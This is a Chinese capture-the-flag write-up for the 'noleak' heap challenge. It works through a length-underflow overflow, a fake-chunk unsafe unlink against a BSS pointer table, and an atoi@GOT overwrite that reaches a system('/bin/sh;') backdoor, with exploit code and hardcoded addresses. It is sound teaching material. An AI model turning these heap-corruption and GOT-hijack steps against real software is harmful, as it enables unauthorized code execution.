# MiniLCTF2020 - noleak

## 题目简述

这是一个无信息泄露要求的堆利用题。64 位 ELF 为 Partial RELRO、Canary、NX、无 PIE；菜单维护的堆指针表位于固定 BSS 地址。编辑时若把长度设为 0，内部的 `len - 1` 发生无符号下溢，形成跨堆块写。利用 unsafe unlink 控制指针表，再覆写 `atoi@GOT` 为固定后门即可。

## 解题过程

当前发布二进制中的关键地址经静态核对为：

```python
ptr_table = 0x6020c0
atoi_got = 0x602068
backdoor = 0x400c9f  # system("/bin/sh;")
```

先布置堆块：

```python
setplan(0x30, b'A')  # idx 0，放 fake chunk
setplan(0,    b'B')  # idx 1，利用 size=0 的任意长编辑
setplan(0xf0, b'C')  # idx 2，稍后触发向后合并
setplan(0x10, b'D')  # idx 3，隔离 top chunk
```

在 idx 0 中伪造 `fd = ptr_table - 0x18`、`bk = ptr_table - 0x10`：

```python
fake = flat(0, 0x21, ptr_table - 0x18, ptr_table - 0x10, 0x20, 0)
edit(0, 0, fake)
```

再从 idx 1 溢出，修改 idx 2 的 `prev_size` 并清除 `PREV_INUSE`：

```python
edit(1, 0, b'A' * 0x10 + p64(0x50) + b'\x00')
end(2)
```

释放 idx 2 时触发 unsafe unlink。unlink 写操作让 BSS 指针表指向自身附近，随后可通过编辑 idx 0 改写其他表项：

```python
edit(0, 0, p64(0) * 3 + p64(atoi_got))
edit(0, 0, p64(backdoor))
```

菜单下一次调用 `atoi()` 解析选项时实际跳入 `0x400c9f`，后门执行 `system('/bin/sh;')`，即可读取 flag。

仓库内另一份旧 exp 把 `0x400cce` 标为 `pwnme`，但该地址在当前 ELF 中位于 `main` 的 `setvbuf` 参数装载处，不是后门入口；本篇采用对当前二进制重新反汇编确认的 `0x400c9f`。

## 方法总结

“noleak”通常意味着利用固定非 PIE 地址完成任意写。unsafe unlink 的两条完整性检查要求 fake chunk 的 `fd/bk` 精确回指目标指针；得到指针表控制后，Partial RELRO 让 GOT 成为最短终点。复用旧 exp 前必须重新核对每个硬编码地址。
